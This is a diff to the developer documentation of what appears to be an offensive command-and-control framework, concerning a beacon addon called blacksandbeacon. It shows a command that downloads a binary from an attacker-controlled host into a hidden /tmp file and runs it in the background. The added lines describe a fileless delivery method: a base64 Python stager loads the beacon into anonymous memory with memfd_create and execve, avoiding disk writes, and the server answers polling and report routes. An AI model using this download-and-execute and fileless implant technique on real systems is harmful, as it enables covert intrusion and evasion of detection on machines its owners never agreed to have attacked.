@@ -477,7 +477,15 @@ tool:
   execute_command: git restore . ; git pull ; make && cp <binary> ../../../sessions/<binary>
   lazycommand: curl -sk "http://{lhost}:{lport}/<binary>" -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc &
 ```
-Rules: always `git restore . ; git pull` before `make`; stage to `sessions/<binary>`; use `{lhost}`/`{lport}` placeholders; never hardcode. Fill `os`/`trigger` so `explore`/`recommend_next` surface the addon. Tests: `tests/test_blacksandbeacon_addon.py` (59).
+Rules: always `git restore . ; git pull` before `make`; stage to `sessions/<binary>`; use `{lhost}`/`{lport}` placeholders; never hardcode. Fill `os`/`trigger` so `explore`/`recommend_next` surface the addon. Tests: `tests/test_blacksandbeacon_addon.py` (64) + `tests/test_bsb_fileless_compat.py` (12).
+
+Fileless beacon delivery (blacksandbeacon): the lazycommand stages a base64
+python stager that pulls the ELF + runtime config from `/s/blacksandbeacon`
+and `/s/blacksandbeacon_config`, memfd_creates both and execve's the beacon
+from anonymous memory (no disk writes). `modules/bof_delivery.deploy_client`
+runs the same stager through exec-capable sessions. New-default wire routes:
+lazyc2 answers `/api/poll/<id>` (poll) and `/report/` (report POST, client id
+inside the encrypted JSON) besides the `/command/` contract.
 
 ---
 
